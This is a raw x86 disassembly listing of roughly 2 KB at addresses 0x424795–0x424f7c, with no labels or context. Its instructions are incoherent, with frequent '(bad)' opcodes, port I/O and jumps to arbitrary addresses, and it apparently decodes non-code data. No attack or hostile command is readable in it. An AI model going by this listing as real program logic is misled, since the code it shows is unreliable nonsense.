  424795:	xlat   BYTE PTR fs:[ebx]
  424797:	sbb    BYTE PTR [edx+0x3afbb6dc],0x8
  42479e:	cmp    al,0x11
  4247a0:	(bad)  
  4247a1:	js     0x424801
  4247a3:	test   DWORD PTR [edi-0x39],0xf85b884b
  4247aa:	loope  0x42482a
  4247ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247ad:	sahf   
  4247ae:	dec    ebx
  4247af:	aam    0x6b
  4247b1:	in     al,0xb0
  4247b3:	test   al,0xcb
  4247b5:	jne    0x42474e
  4247b7:	les    ebx,FWORD PTR [esi-0xd]
  4247ba:	jge    0x4247f2
  4247bc:	jb     0x424740
  4247be:	cmc    
  4247bf:	pop    esp
  4247c0:	push   0xe53bf6f4
  4247c5:	jns    0x42476f
  4247c7:	xchg   edx,eax
  4247c8:	sbb    BYTE PTR [ebp-0x52],ch
  4247cb:	xchg   DWORD PTR [edi+0x6e],ecx
  4247ce:	push   ebx
  4247cf:	out    dx,al
  4247d0:	repz mov ebx,db4
  4247d4:	cmp    DWORD PTR [ebp+0x2cf81196],esp
  4247da:	std    
  4247db:	push   ebx
  4247dc:	(bad)  
  4247dd:	in     eax,dx
  4247de:	rcl    eax,cl
  4247e0:	push   esi
  4247e1:	fwait
  4247e2:	inc    eax
  4247e3:	pop    ds
  4247e4:	inc    edi
  4247e5:	cs push 0xffffffce
  4247e8:	inc    edx
  4247e9:	icebp  
  4247ea:	pop    ebp
  4247eb:	daa    
  4247ec:	cmp    eax,0x7e9df105
  4247f1:	pop    edi
  4247f2:	add    eax,0x2a51a473
  4247f7:	repz jno 0x4247d0
  4247fa:	jp     0x42480c
  4247fc:	adc    al,0xf7
  4247fe:	iret   
  4247ff:	cmp    DWORD PTR [esi+0x20b14e6c],esp
  424805:	mov    bh,0xcd
  424807:	and    DWORD PTR [ebx+0x3f792193],ebx
  42480d:	lods   al,BYTE PTR ds:[esi]
  42480e:	imul   edx,DWORD PTR [ebx-0x7408d59e],0xffffffe2
  424815:	rol    ch,1
  424817:	(bad)  
  424818:	mov    cl,0xd2
  42481a:	enter  0xb656,0x41
  42481e:	push   esp
  42481f:	xor    al,0xb2
  424821:	rcr    BYTE PTR [ebp-0x8b8f584],0x8c
  424828:	stos   DWORD PTR es:[edi],eax
  424829:	and    BYTE PTR [edi],dl
  42482b:	or     al,0xbb
  42482d:	or     cl,BYTE PTR [edx-0x556ff778]
  424833:	enter  0x578f,0x71
  424837:	mov    al,0x37
  424839:	sbb    ah,bl
  42483b:	fucom  st(7)
  42483d:	cmp    eax,0xf3161f37
  424842:	retf   0x693b
  424845:	cwde   
  424846:	std    
  424847:	ja     0x424887
  424849:	fistp  DWORD PTR [edx-0x66]
  42484c:	adc    al,0xa9
  42484e:	mov    al,0x12
  424850:	jg     0x424879
  424852:	rcl    DWORD PTR [ebx],0xd9
  424855:	(bad)  
  424856:	es aaa 
  424858:	fsubr  QWORD PTR [edi]
  42485a:	cwde   
  42485b:	nop
  42485c:	punpckhwd mm5,QWORD PTR [ebx+esi*1-0x9]
  424861:	outs   dx,DWORD PTR ds:[esi]
  424862:	repz rcl BYTE PTR [ebp+0x62cac911],0xe7
  42486a:	out    dx,al
  42486b:	mov    eax,0x4432f89a
  424870:	cdq    
  424871:	mov    esi,0x60c9709a
  424876:	(bad)  
  424877:	mov    edx,0xb5eeb423
  42487c:	ret    
  42487d:	sub    edx,DWORD PTR [ebp-0x7b]
  424880:	cmp    eax,0xfd1312c6
  424885:	mov    cs,WORD PTR gs:[ebx]
  424888:	je     0x42489f
  42488a:	rcr    DWORD PTR [edi-0x47],0x30
  42488e:	nop
  42488f:	es ror eax,0x82
  424893:	cwde   
  424894:	add    ah,dh
  424896:	xchg   ebx,eax
  424897:	ret    0x7fd8
  42489a:	xchg   BYTE PTR [ebx],ch
  42489c:	loopne 0x424854
  42489e:	inc    edi
  42489f:	xor    DWORD PTR [esi+0x5f161dbe],eax
  4248a5:	inc    eax
  4248a6:	or     BYTE PTR [edx+ecx*8-0x24],0xbe
  4248ab:	sbb    ah,bh
  4248ad:	xchg   esp,eax
  4248ae:	jno    0x424832
  4248b0:	cld    
  4248b1:	mov    ebx,0x345a835b
  4248b6:	cld    
  4248b7:	add    cl,BYTE PTR [ebx-0x4e679a6b]
  4248bd:	fnstcw WORD PTR [edi-0x1db02690]
  4248c3:	rcl    BYTE PTR [esi],1
  4248c5:	in     al,0xb4
  4248c7:	inc    esp
  4248c8:	ror    DWORD PTR [eax+0x26],cl
  4248cb:	idiv   DWORD PTR [edi+0x3bc5a596]
  4248d1:	push   edi
  4248d2:	cmp    cl,BYTE PTR [ecx-0x5babdb51]
  4248d8:	jle    0x4248e5
  4248da:	sub    DWORD PTR [esi-0x7a7c77f8],ebp
  4248e0:	and    bh,BYTE PTR [edi+0x2402bde4]
  4248e6:	mov    edx,0x95b7f1e
  4248eb:	jg     0x4248d1
  4248ed:	dec    ebx
  4248ee:	or     esp,DWORD PTR [edx-0xb]
  4248f1:	mov    bh,0x78
  4248f3:	xchg   ebx,eax
  4248f4:	xchg   edi,eax
  4248f5:	test   al,0x8c
  4248f7:	scas   eax,DWORD PTR es:[edi]
  4248f8:	pop    ecx
  4248f9:	push   ecx
  4248fa:	xchg   esi,eax
  4248fb:	mov    edx,0x45f74f80
  424900:	push   ds
  424901:	inc    edx
  424902:	mov    ?,WORD PTR [esi]
  424904:	push   ecx
  424905:	sbb    eax,0xedfba63
  42490a:	aam    0x18
  42490c:	mov    ah,0x2a
  42490e:	nop
  42490f:	mov    cl,BYTE PTR [ecx-0x64c62cf6]
  424915:	iret   
  424916:	aam    0x6b
  424918:	in     eax,0x59
  42491a:	push   esp
  42491b:	xor    DWORD PTR [edx-0x6d],0xffffffe4
  42491f:	(bad)  
  424920:	mov    edx,eax
  424922:	pop    ecx
  424923:	inc    esi
  424924:	mov    esi,0x479a4a21
  424929:	jle    0x424986
  42492b:	in     eax,0x18
  42492d:	(bad)  
  42492e:	fs sar esp,cl
  424931:	xor    eax,0x6d1272a0
  424936:	in     eax,dx
  424937:	mov    dh,0x38
  424939:	fistp  QWORD PTR [ecx+0x6313c342]
  42493f:	and    BYTE PTR [ebx-0x289f0487],ch
  424945:	lods   al,BYTE PTR ds:[esi]
  424946:	bound  ebp,QWORD PTR [eax+0x495767dd]
  42494c:	dec    ebp
  42494d:	sub    BYTE PTR [edx-0x788b9c6],bl
  424953:	mov    dl,BYTE PTR ds:0xf59bcde
  424959:	stos   BYTE PTR es:[edi],al
  42495a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42495b:	cwde   
  42495c:	sub    al,0x52
  42495e:	push   ds
  42495f:	push   ecx
  424960:	jb     0x4249de
  424962:	dec    ecx
  424963:	mov    es,WORD PTR [eax+eax*4-0x9]
  424967:	mov    al,al
  424969:	inc    esp
  42496a:	push   0xaf229729
  42496f:	jb     0x42490c
  424971:	mov    ds:0x8d9e3ba4,al
  424976:	sub    esi,esi
  424978:	out    dx,eax
  424979:	pop    eax
  42497a:	mov    ecx,0xfb28f235
  42497f:	push   ecx
  424980:	push   ecx
  424981:	js     0x42496f
  424983:	int3   
  424984:	sub    BYTE PTR [ecx+0x1d],bl
  424987:	push   ebp
  424988:	lea    ebp,[esi]
  42498a:	adc    BYTE PTR [edi+0xc],ch
  42498d:	fiadd  WORD PTR [edx+0x3c]
  424990:	xor    BYTE PTR [edi],ch
  424992:	or     BYTE PTR [ebx-0xa478b16],cl
  424998:	inc    esi
  424999:	jnp    0x424962
  42499b:	add    edx,edi
  42499d:	push   es
  42499e:	cld    
  42499f:	test   BYTE PTR [eax-0x11f570fe],cl
  4249a5:	les    esp,FWORD PTR [edx+0x58c5959b]
  4249ab:	push   edi
  4249ac:	pop    ebx
  4249ad:	(bad)  
  4249ae:	mov    cl,0xf7
  4249b0:	ffree  st(1)
  4249b2:	stc    
  4249b3:	or     ch,bh
  4249b5:	push   esi
  4249b6:	stc    
  4249b7:	int3   
  4249b8:	les    esp,FWORD PTR [ecx+edi*4]
  4249bb:	sahf   
  4249bc:	adc    DWORD PTR [esi-0x40780fef],0xe63bca1b
  4249c6:	add    eax,0x479c1b53
  4249cb:	lahf   
  4249cc:	retf   0xce2d
  4249cf:	cmp    BYTE PTR [edi+edi*2+0x25a38d64],ch
  4249d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249d7:	sahf   
  4249d8:	fs push eax
  4249da:	add    dl,BYTE PTR [edi+0x30]
  4249dd:	test   al,0xce
  4249df:	mov    cl,0x65
  4249e1:	fadd   DWORD PTR [esi]
  4249e3:	xchg   ebp,eax
  4249e4:	pop    edi
  4249e5:	or     eax,0x62cad637
  4249ea:	out    0x7b,al
  4249ec:	jle    0x4249dd
  4249ee:	add    dh,BYTE PTR [edx+ecx*4]
  4249f1:	test   eax,0x54acbacf
  4249f6:	xchg   cl,bh
  4249f8:	xchg   ecx,eax
  4249f9:	dec    edx
  4249fa:	mov    ebx,0x18fe6b62
  4249ff:	les    ecx,FWORD PTR [ebx+0x3281e2f0]
  424a05:	in     al,dx
  424a06:	cmp    DWORD PTR [esi-0x49056f12],0xcaacae1d
  424a10:	jb     0x4249b8
  424a12:	mov    cl,0x70
  424a14:	sub    eax,0xa6d5e8a7
  424a19:	or     al,0x12
  424a1b:	xchg   edx,eax
  424a1c:	mov    BYTE PTR [edx+edi*8],ch
  424a1f:	lods   eax,DWORD PTR ds:[esi]
  424a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a21:	out    0x53,eax
  424a23:	mov    eax,ds:0xc3c7ef21
  424a29:	jmp    0xdb4a:0x533f19cd
  424a30:	pop    ss
  424a31:	add    eax,0xb104b6b0
  424a36:	or     DWORD PTR [eax+ebx*1-0x1a],edi
  424a3a:	(bad)  
  424a3b:	pop    ebp
  424a3c:	inc    ebp
  424a3d:	add    ebp,ecx
  424a3f:	sub    DWORD PTR [edx],0xb38ba3d7
  424a45:	(bad)  
  424a47:	idiv   BYTE PTR [esi+ebx*2]
  424a4a:	add    al,0x5
  424a4c:	jns    0x424abb
  424a4e:	ss dec edx
  424a50:	pushf  
  424a51:	dec    edi
  424a52:	rcl    edi,cl
  424a54:	mov    ecx,0xb0ae38ce
  424a59:	imul   ebx,DWORD PTR [edx+0x402b00b2],0xf49e84d0
  424a63:	ins    BYTE PTR es:[edi],dx
  424a64:	test   BYTE PTR [esi-0x57],dh
  424a67:	mov    ch,0x7d
  424a69:	push   ss
  424a6a:	adc    eax,0x3b46a1d5
  424a6f:	(bad)  
  424a70:	(bad)  
  424a71:	ins    BYTE PTR es:[edi],dx
  424a72:	cmp    BYTE PTR [ecx-0x32],bl
  424a75:	xchg   esi,edx
  424a77:	mov    ah,BYTE PTR [eax-0x2eac8a55]
  424a7d:	repz pop eax
  424a7f:	push   0xffffffe9
  424a81:	(bad)  
  424a82:	retf   0xf8c8
  424a85:	jbe    0x424abc
  424a87:	adc    eax,ecx
  424a89:	(bad)  
  424a8a:	mov    esp,0xe158f4a7
  424a8f:	push   ds
  424a90:	xor    eax,0x69f979d9
  424a95:	test   eax,0xfec2cb88
  424a9a:	xor    ah,BYTE PTR [ebx-0x3587ea75]
  424aa0:	adc    al,0x7e
  424aa2:	dec    ecx
  424aa3:	in     eax,0x3b
  424aa5:	inc    esp
  424aa6:	mov    ebx,0x664d3b01
  424aab:	sbb    ah,BYTE PTR [edi]
  424aad:	pop    ebx
  424aae:	sub    al,0x27
  424ab0:	cmp    BYTE PTR [ebx],al
  424ab2:	cmp    dh,BYTE PTR [ecx]
  424ab4:	test   eax,0x33cc4302
  424ab9:	adc    esp,DWORD PTR [eax-0x60]
  424abc:	mov    ch,0xe0
  424abe:	mov    cl,0xc2
  424ac0:	cmp    ecx,DWORD PTR [ebx]
  424ac2:	sub    BYTE PTR [eax-0x21b0e7b4],ah
  424ac8:	sahf   
  424ac9:	test   al,0x10
  424acb:	mov    ecx,0x45c09362
  424ad0:	rcr    BYTE PTR [ebx+0x566af8a8],1
  424ad6:	inc    ebx
  424ad7:	sub    DWORD PTR [esi+0xa],ebx
  424ada:	into   
  424adb:	adc    eax,0x8f664771
  424ae0:	xor    eax,0x38bf6f02
  424ae5:	int    0x49
  424ae7:	lahf   
  424ae8:	jg     0x424a71
  424aea:	pop    eax
  424aeb:	imul   esp,DWORD PTR [edi+0x30dfc5a6],0xf01b7323
  424af5:	daa    
  424af6:	fstp   st(4)
  424af8:	dec    eax
  424af9:	fmul   st,st(4)
  424afb:	pop    eax
  424afc:	rcr    DWORD PTR [ecx+0x1f],cl
  424aff:	adc    BYTE PTR [ebx+0x54],bl
  424b02:	jmp    0xb20a4fb3
  424b07:	ret    0x3408
  424b0a:	and    eax,0xb10144f8
  424b0f:	mov    BYTE PTR [ecx-0x73],0xde
  424b13:	lock mov eax,0x9a7a1fa5
  424b19:	mov    ecx,0x8274f2d2
  424b1e:	dec    ecx
  424b1f:	dec    eax
  424b20:	aad    0x90
  424b22:	jmp    0x424b7f
  424b24:	inc    ecx
  424b25:	jo     0x424b3a
  424b27:	test   eax,0x20b4891d
  424b2c:	xchg   edi,eax
  424b2d:	inc    ebp
  424b2e:	dec    ecx
  424b2f:	add    bl,BYTE PTR [edi+0x1ffe6ef2]
  424b35:	fidivr WORD PTR [esi]
  424b37:	cmp    al,0x9b
  424b39:	adc    BYTE PTR [ebp+edi*8-0x66],bh
  424b3d:	mov    ecx,0x7d2f6d27
  424b42:	(bad)  [ebx-0x2d]
  424b45:	scas   eax,DWORD PTR es:[edi]
  424b46:	sbb    ecx,ecx
  424b48:	jne    0x424b34
  424b4a:	xor    DWORD PTR [edi-0x44],ecx
  424b4d:	test   al,0x3
  424b4f:	jae    0x424bc6
  424b51:	pop    edi
  424b52:	ficomp DWORD PTR [edi+0x74]
  424b55:	loop   0x424b88
  424b57:	add    eax,0xe03ceaf5
  424b5c:	cmp    al,BYTE PTR ds:[ecx+0x9]
  424b60:	out    dx,eax
  424b61:	xchg   ecx,eax
  424b62:	lock pop ss
  424b64:	pushf  
  424b65:	xchg   ebp,eax
  424b66:	fcom   QWORD PTR [ebx+ebp*2+0x1d]
  424b6a:	mov    dl,0x7d
  424b6c:	mov    WORD PTR ds:0x1d7a1242,cs
  424b72:	inc    DWORD PTR [edx-0x22bcefb9]
  424b78:	(bad)  
  424b79:	sbb    bh,dl
  424b7b:	cld    
  424b7c:	pop    es
  424b7d:	mov    esp,0x1f629222
  424b83:	xchg   ecx,eax
  424b84:	out    dx,eax
  424b85:	(bad)  
  424b86:	imul   edx,DWORD PTR [eax+0x6331113d],0xd2f16405
  424b90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b91:	es jns 0x424bb8
  424b94:	add    BYTE PTR [ecx],dh
  424b96:	mov    BYTE PTR [edx-0x46],ah
  424b99:	sub    eax,0x1fd88931
  424b9e:	ret    0xa49d
  424ba1:	sub    DWORD PTR [ecx],esp
  424ba3:	inc    ebp
  424ba4:	mov    ch,0xc2
  424ba6:	pop    ss
  424ba7:	add    BYTE PTR [ecx+ebx*4],cl
  424baa:	nop    eax
  424bad:	fild   WORD PTR ds:0x9607617
  424bb3:	push   esi
  424bb4:	adc    eax,0x9274edaa
  424bb9:	push   DWORD PTR [ebp-0x17]
  424bbc:	popa   
  424bbd:	(bad)  
  424bbe:	sub    esi,DWORD PTR [esi]
  424bc0:	or     BYTE PTR ds:[edi-0x3d8a77f4],cl
  424bc7:	rep outs dx,BYTE PTR ds:[esi]
  424bc9:	mov    DWORD PTR [ecx],edx
  424bcb:	xor    cl,BYTE PTR [edi+0x30c91be8]
  424bd1:	xor    dh,BYTE PTR [esi-0x5ff6b372]
  424bd7:	sbb    DWORD PTR [ebx+0x2b3efc80],0xf790d74e
  424be1:	jno    0x424b85
  424be3:	(bad)  
  424be4:	xchg   ecx,eax
  424be5:	movaps XMMWORD PTR [edx-0x7cd4087a],xmm2
  424bec:	jno    0x424bad
  424bee:	fwait
  424bef:	dec    esp
  424bf0:	sub    ah,BYTE PTR ds:0x5dd7b3e8
  424bf6:	es push esi
  424bf8:	xor    ecx,esp
  424bfa:	fcomp  st(0)
  424bfc:	xchg   ebx,eax
  424bfd:	cmp    eax,0x1744576a
  424c02:	sbb    BYTE PTR [eax+0x427560fe],bl
  424c08:	and    bl,ch
  424c0a:	mov    cs,edx
  424c0c:	mov    bl,0x73
  424c0e:	daa    
  424c0f:	(bad)  
  424c10:	dec    ebp
  424c11:	scas   eax,DWORD PTR es:[edi]
  424c12:	sub    esi,DWORD PTR [ebx+0x1af51c3e]
  424c18:	popa   
  424c19:	cld    
  424c1a:	(bad)  
  424c1b:	call   0x97d2:0x6f6b24e6
  424c22:	mov    esp,esi
  424c24:	in     al,0xae
  424c26:	les    esp,FWORD PTR [esi-0x76]
  424c29:	ret    0x369e
  424c2c:	stos   DWORD PTR es:[edi],eax
  424c2d:	push   edi
  424c2e:	jecxz  0x424c68
  424c30:	jnp    0x424c3f
  424c32:	ja     0x424bf2
  424c34:	adc    edi,DWORD PTR [esi+0x2d]
  424c37:	xor    al,0xcb
  424c39:	repz loop 0x424bda
  424c3c:	in     al,0x20
  424c3e:	fstp   DWORD PTR [eax]
  424c40:	mov    eax,ds:0xe1186c3b
  424c45:	adc    al,0x82
  424c47:	push   ecx
  424c48:	xor    ecx,ebp
  424c4a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c4c:	adc    al,0xf7
  424c4e:	jnp    0x424c08
  424c50:	push   ecx
  424c51:	inc    ebp
  424c52:	xor    eax,0xca4c9cbd
  424c57:	mov    al,0x97
  424c59:	mov    ds:0x2a2f8e8d,eax
  424c5e:	in     eax,0x9d
  424c60:	rcl    BYTE PTR [edi-0x74],0xb5
  424c64:	sbb    ecx,DWORD PTR [edx+0x4c]
  424c67:	shl    cl,cl
  424c69:	bound  esi,QWORD PTR [edi-0x36]
  424c6c:	jno    0x424c28
  424c6e:	iret   
  424c6f:	sub    DWORD PTR [eax+ecx*1],ebp
  424c72:	mov    edi,0x30fa9660
  424c77:	dec    eax
  424c78:	stos   BYTE PTR es:[edi],al
  424c79:	inc    esp
  424c7a:	fs test bl,bh
  424c7d:	xchg   edx,ebx
  424c7f:	ss or  eax,0x8a427625
  424c85:	(bad)  
  424c86:	xor    al,0x9a
  424c88:	repnz mov esp,0x4c0fd13
  424c8e:	push   esp
  424c8f:	adc    DWORD PTR [ecx+0x1c9d313],0x124177eb
  424c99:	mov    ch,0xc4
  424c9b:	mov    edx,esi
  424c9d:	loop   0x424cac
  424c9f:	fimul  DWORD PTR [ebp+0x11709cf5]
  424ca5:	sbb    eax,0xad42ef2d
  424caa:	gs adc eax,0xf0db7690
  424cb0:	mov    edx,0xc5a18c24
  424cb5:	jp     0x424cdd
  424cb7:	sbb    al,BYTE PTR [esi-0x43b0a812]
  424cbd:	cmc    
  424cbe:	mov    eax,ds:0xf5caa065
  424cc3:	test   eax,0x2e2bd518
  424cc8:	lds    ebp,FWORD PTR [ebp-0x6c]
  424ccb:	das    
  424ccc:	or     al,0x32
  424cce:	ja     0x424cff
  424cd0:	push   ebx
  424cd1:	clc    
  424cd2:	test   al,0xc7
  424cd4:	push   cs
  424cd5:	icebp  
  424cd6:	push   ss
  424cd7:	pand   mm6,QWORD PTR gs:[ecx-0x5c]
  424cdc:	cs jo  0x424ce9
  424cdf:	arpl   WORD PTR [eax],ax
  424ce1:	(bad)  
  424ce3:	pop    es
  424ce4:	xchg   ecx,eax
  424ce5:	fild   DWORD PTR [ecx+ebx*1-0x43f4bfc4]
  424cec:	or     edi,DWORD PTR [ebx+0x3e4b111]
  424cf2:	sub    BYTE PTR [ebx-0x356cd86a],dl
  424cf8:	out    0x4,eax
  424cfa:	xor    BYTE PTR [esi-0x1ef0af17],0xa8
  424d01:	call   0xcad430ba
  424d06:	in     al,0xa
  424d08:	pop    esi
  424d09:	pushf  
  424d0a:	inc    eax
  424d0b:	shl    ebp,cl
  424d0d:	fnstenv [ebp+0x7a]
  424d10:	shl    DWORD PTR [edi-0x6d],1
  424d13:	std    
  424d14:	int    0x9c
  424d16:	sub    al,0x5c
  424d18:	adc    al,0x3f
  424d1a:	jecxz  0x424d7f
  424d1c:	out    dx,al
  424d1d:	push   ds
  424d1e:	not    BYTE PTR [eax]
  424d20:	adc    al,0x87
  424d22:	fs dec ebx
  424d24:	out    dx,eax
  424d25:	loop   0x424d35
  424d27:	jle    0x424cef
  424d29:	dec    esp
  424d2a:	mov    ch,0x34
  424d2c:	sti    
  424d2d:	add    DWORD PTR [ecx+esi*2],edi
  424d30:	mov    ecx,0x84c675e
  424d35:	lock xlat BYTE PTR ds:[ebx]
  424d37:	ror    eax,cl
  424d39:	lods   al,BYTE PTR ds:[esi]
  424d3a:	jbe    0x424cc0
  424d3c:	enter  0x29ac,0xd5
  424d40:	lea    ebx,[ecx+0x19]
  424d43:	ins    BYTE PTR es:[edi],dx
  424d44:	push   ds
  424d45:	mov    WORD PTR [eax],ss
  424d47:	hlt    
  424d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d49:	cs loop 0x424cf8
  424d4c:	lods   eax,DWORD PTR ds:[esi]
  424d4d:	cmc    
  424d4e:	call   0xefe5:0x9ac762b5
  424d55:	mov    esp,fs
  424d57:	dec    esi
  424d58:	popa   
  424d59:	push   ebx
  424d5a:	sub    dl,ch
  424d5c:	pop    ebx
  424d5d:	adc    ch,BYTE PTR [ebx]
  424d5f:	or     eax,0x7f0d2508
  424d64:	or     eax,0x8db62c30
  424d69:	out    0xfa,al
  424d6b:	scas   eax,DWORD PTR es:[edi]
  424d6c:	push   es
  424d6d:	rcr    DWORD PTR [ebx-0x29],0xc6
  424d71:	add    esi,DWORD PTR [edi+0xf3555f4]
  424d77:	lds    esp,FWORD PTR ds:0x1ebe434c
  424d7d:	enter  0x5152,0x88
  424d81:	pusha  
  424d82:	xor    ch,BYTE PTR [edi+ebp*1]
  424d85:	jp     0x424db2
  424d87:	xlat   BYTE PTR ds:[ebx]
  424d88:	xchg   ebp,eax
  424d89:	scas   al,BYTE PTR es:[edi]
  424d8a:	fcomp  QWORD PTR [eax]
  424d8c:	aad    0x64
  424d8e:	mov    ch,0x65
  424d90:	imul   ecx,DWORD PTR [eax],0xffffffd6
  424d93:	add    eax,0xeed9b232
  424d98:	mov    bh,ah
  424d9a:	ficomp WORD PTR [edi+eax*2]
  424d9d:	pop    edi
  424d9e:	sbb    al,0x65
  424da0:	jmp    0x9d171a02
  424da5:	addr16 adc al,0xd3
  424da8:	lock js 0x424dd6
  424dab:	aas    
  424dac:	lods   eax,DWORD PTR ds:[esi]
  424dad:	jmp    0xd535f534
  424db2:	enter  0x9cc0,0xd4
  424db6:	adc    ebx,ebp
  424db8:	xor    edi,DWORD PTR [esi]
  424dba:	setge  BYTE PTR [edi+0x74]
  424dbe:	(bad)  
  424dbf:	jns    0x424e0a
  424dc1:	test   eax,0xd49cecb
  424dc6:	push   esp
  424dc7:	xchg   esp,eax
  424dc8:	xlat   BYTE PTR ds:[ebx]
  424dc9:	outs   dx,DWORD PTR ds:[esi]
  424dca:	fnstcw WORD PTR [ebx-0x12fd57cb]
  424dd0:	ficom  WORD PTR ds:0xe1e5eb48
  424dd6:	inc    ebp
  424dd7:	push   ebx
  424dd8:	shr    BYTE PTR [edx],0x94
  424ddb:	sbb    DWORD PTR [esi],eax
  424ddd:	lods   al,BYTE PTR ds:[esi]
  424dde:	(bad)  
  424ddf:	pop    ecx
  424de0:	mov    dh,0x79
  424de2:	test   eax,0x915fc8fc
  424de7:	or     esi,DWORD PTR [eax+0x771a2b5b]
  424ded:	xchg   ebp,eax
  424dee:	enter  0x9220,0x4c
  424df2:	add    DWORD PTR [edx+eiz*2],ebx
  424df5:	(bad)  
  424df6:	and    al,0xf0
  424df8:	outs   dx,DWORD PTR ds:[esi]
  424df9:	sbb    DWORD PTR [ebx-0x36dabc0],edx
  424dff:	hlt    
  424e00:	xlat   BYTE PTR ds:[ebx]
  424e01:	scas   eax,DWORD PTR es:[edi]
  424e02:	ficomp DWORD PTR [esi+ebp*4]
  424e05:	mov    esi,0x521ec707
  424e0a:	aas    
  424e0b:	out    0xfd,al
  424e0d:	std    
  424e0e:	(bad)  
  424e0f:	clc    
  424e10:	or     al,0xb8
  424e12:	shr    edi,cl
  424e14:	pop    ds
  424e15:	adc    dl,BYTE PTR [edx-0x7e]
  424e18:	std    
  424e19:	rol    BYTE PTR [ecx],1
  424e1b:	sbb    eax,0x51419be4
  424e20:	mov    ebp,gs
  424e22:	pusha  
  424e23:	int3   
  424e24:	mov    al,dh
  424e26:	ins    BYTE PTR es:[edi],dx
  424e27:	outs   dx,BYTE PTR ds:[esi]
  424e28:	fcomp  DWORD PTR [edi]
  424e2a:	das    
  424e2b:	push   0xffffff86
  424e2d:	mov    gs,WORD PTR [edi+0x34]
  424e30:	call   0xaa0d:0x6c66bc5e
  424e37:	sub    esi,0x66eb804f
  424e3d:	icebp  
  424e3e:	xchg   edx,eax
  424e3f:	popf   
  424e40:	jb     0x424e8d
  424e42:	pop    esp
  424e43:	or     BYTE PTR [esi-0x737de0a3],bl
  424e49:	test   eax,0xdd5973b3
  424e4e:	cmp    BYTE PTR [esi+0x26ef211f],0x80
  424e55:	clc    
  424e56:	out    dx,al
  424e57:	push   cs
  424e58:	jno    0x424eb2
  424e5a:	inc    ebx
  424e5b:	xor    dh,BYTE PTR [eax+ebp*4+0x38e78246]
  424e62:	jb     0x424e98
  424e64:	sub    eax,0xdd696
  424e69:	fld    st(6)
  424e6b:	sub    dh,bh
  424e6d:	and    eax,0xfdef8cd7
  424e72:	xchg   esi,eax
  424e73:	or     DWORD PTR [ebp-0x76],eax
  424e76:	fstp   TBYTE PTR [ecx+0x55c7e72e]
  424e7c:	out    0x2b,al
  424e7e:	mov    fs,WORD PTR [ebp+eax*8-0x12af80a1]
  424e85:	mov    al,ds:0x578d1a5f
  424e8a:	mov    al,0x7a
  424e8c:	jmp    0x424ee0
  424e8e:	test   eax,0xafa82cb7
  424e93:	add    al,0xe6
  424e95:	call   0xf5c319e
  424e9a:	dec    esp
  424e9b:	data16 in al,dx
  424e9d:	sub    al,0xed
  424e9f:	ret    
  424ea0:	in     al,0xe2
  424ea2:	addr16 retf 
  424ea4:	repz das 
  424ea6:	out    0xbd,al
  424ea8:	inc    edi
  424ea9:	inc    eax
  424eaa:	iret   
  424eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424eac:	daa    
  424ead:	cmp    al,0xf4
  424eaf:	out    dx,eax
  424eb0:	out    dx,eax
  424eb1:	lahf   
  424eb2:	jl     0x424f0d
  424eb4:	shr    DWORD PTR [edi],cl
  424eb6:	stos   DWORD PTR es:[edi],eax
  424eb7:	cmp    eax,0x17c9e8ef
  424ebc:	xor    dh,bl
  424ebe:	mov    ecx,0xd6983924
  424ec3:	inc    ecx
  424ec4:	stos   BYTE PTR es:[edi],al
  424ec5:	or     DWORD PTR [esi],0xffffff9f
  424ec8:	sti    
  424ec9:	fld    QWORD PTR [edi-0x370e0c31]
  424ecf:	jle    0x424f4f
  424ed1:	js     0x424e64
  424ed3:	imul   ecx,DWORD PTR ds:0x2d2c9179,0xe110e8f8
  424edd:	adc    BYTE PTR [ebx+eax*1+0x3],al
  424ee1:	jne    0x424ee3
  424ee3:	cwde   
  424ee4:	pop    ebx
  424ee5:	fmulp  st(0),st
  424ee7:	jb     0x424ef7
  424ee9:	or     al,0xa0
  424eeb:	ja     0x424ec2
  424eed:	lds    ecx,FWORD PTR [esi-0x44]
  424ef0:	xchg   esp,eax
  424ef1:	in     al,0x23
  424ef3:	mov    ebx,0xd24a4eb
  424ef8:	jnp    0x424f1f
  424efa:	mov    ebp,DWORD PTR [eax]
  424efc:	xchg   edx,eax
  424efd:	call   FWORD PTR [ebp+0xc]
  424f00:	scas   al,BYTE PTR es:[edi]
  424f01:	mov    edx,0xf0586034
  424f06:	pop    esp
  424f07:	imul   ecx,DWORD PTR [edx+0x7ef63905],0xc94e2d83
  424f11:	push   esi
  424f12:	add    ebx,DWORD PTR [esi+0x1c]
  424f15:	ja     0x424ef3
  424f17:	clc    
  424f18:	mov    ah,BYTE PTR ds:0xfdc806a6
  424f1e:	push   edi
  424f1f:	push   ecx
  424f20:	sub    DWORD PTR [ebp-0x4e],0xa87b9aef
  424f27:	and    BYTE PTR [eax+0x60],ah
  424f2a:	inc    edx
  424f2b:	out    dx,al
  424f2c:	push   ecx
  424f2d:	pop    esp
  424f2e:	ja     0x424eb4
  424f30:	fst    QWORD PTR [edx-0x32]
  424f33:	sar    bl,1
  424f35:	dec    esp
  424f36:	cmp    ah,BYTE PTR [edi+0x44]
  424f39:	dec    esi
  424f3a:	fsubr  QWORD PTR [ebx-0x1530712a]
  424f40:	mov    bh,0xaa
  424f42:	sub    eax,0x399c495e
  424f47:	push   0x9126a23b
  424f4c:	and    ebp,DWORD PTR [edx-0x5]
  424f4f:	mov    cl,0xc
  424f51:	jg     0x424f98
  424f53:	mov    eax,ds:0x1c4163a7
  424f58:	mov    ch,0xb8
  424f5a:	pop    esi
  424f5b:	xchg   edx,eax
  424f5c:	enter  0x978c,0x59
  424f60:	std    
  424f61:	out    dx,eax
  424f62:	hlt    
  424f63:	out    dx,eax
  424f64:	jmp    0x424ee9
  424f66:	pop    esi
  424f67:	outs   dx,DWORD PTR ds:[esi]
  424f68:	and    BYTE PTR [esi+0x2365e749],0xa6
  424f6f:	mov    edx,esp
  424f71:	mov    eax,ds:0x5abeba6b
  424f76:	adc    ebp,esp
  424f78:	jle    0x424f9e
  424f7a:	mov    dl,0x1e
  424f7c:	add    BYTE PTR [ebx],bh
